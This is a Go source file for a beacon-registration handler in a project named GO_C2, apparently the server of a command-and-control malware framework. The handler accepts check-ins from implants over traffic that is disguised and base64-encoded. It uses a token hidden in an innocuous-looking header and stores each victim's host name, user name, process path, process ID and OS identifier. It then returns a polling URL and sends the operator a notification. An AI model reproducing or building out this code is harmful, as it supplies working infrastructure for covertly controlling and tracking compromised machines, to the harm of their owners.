package handler

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "unicode/utf8"
    "strings"
    "time"

    "github.com/gin-gonic/gin"
    "github.com/google/uuid"

    "GO_C2/config"
    "GO_C2/db"
    "GO_C2/utils"
)

func RegisterHandler(c *gin.Context) {
    log.Printf("收到注册请求")
    token := c.GetHeader("X-Request-ID")
    if !utils.ValidateClientToken(token) { log.Printf("Token验证失败"); c.JSON(http.StatusUnauthorized, gin.H{"error":"Invalid token"}); return }

    var registerInfo db.BeaconRegisterInfo
    body, err := c.GetRawData(); if err != nil { log.Printf("读取请求体失败: %v", err); c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid request body"}); return }

    var jsonData []byte
    unwrapped := utils.UnwrapDataFromDisguise(string(body))
    decoded, err := base64.StdEncoding.DecodeString(unwrapped)
    if err != nil {
        if !utf8.Valid([]byte(unwrapped)) { log.Printf("无效的UTF-8编码"); c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid UTF-8 encoding"}); return }
        jsonData = []byte(unwrapped)
    } else {
        if !utf8.Valid(decoded) { log.Printf("Base64解码后数据无效的UTF-8编码"); c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid UTF-8 encoding after base64 decode"}); return }
        jsonData = decoded
    }

    decoder := json.NewDecoder(bytes.NewReader(jsonData))
    decoder.UseNumber()
    if err := decoder.Decode(&registerInfo); err != nil { log.Printf("JSON解析失败: %v", err); c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("Invalid JSON: %v", err)}); return }

    processPath := registerInfo.ProcessPath
    processPath = strings.ReplaceAll(processPath, "\\\\", "\\")
    registerInfo.ProcessPath = processPath

    if !utils.ValidateBeaconRegisterInfo(&registerInfo) { log.Printf("注册信息验证失败"); c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid register info"}); return }

    newUUID := uuid.New().String()
    ip := c.GetHeader("CF-Connecting-IP"); if ip == "" { ip = c.ClientIP() }
    beacon := &db.Beacon{ IP: ip, HostName: registerInfo.HostName, UserName: registerInfo.UserName,
        ProcessName: registerInfo.ProcessName, ProcessPath: processPath, ProcessID: registerInfo.ProcessID,
        Arch: registerInfo.Arch, OSUUID: registerInfo.OSUUID, UUID: newUUID, FirstTime: time.Now(), LastSeen: time.Now() }
    if err := db.CreateBeacon(beacon); err != nil { log.Printf("创建Beacon记录失败: %v", err); c.JSON(http.StatusInternalServerError, gin.H{"error":"Failed to create beacon"}); return }
    log.Printf("Beacon注册成功，UUID: %s", newUUID)
    c.JSON(http.StatusOK, gin.H{"status":"success","url": config.GlobalConfig.Routes.BeaconEndpoint + "?clientId=" + newUUID})
    beacon.UUID = newUUID
    go utils.SendBeaconRegistrationMarkdownNotification(beacon)
}


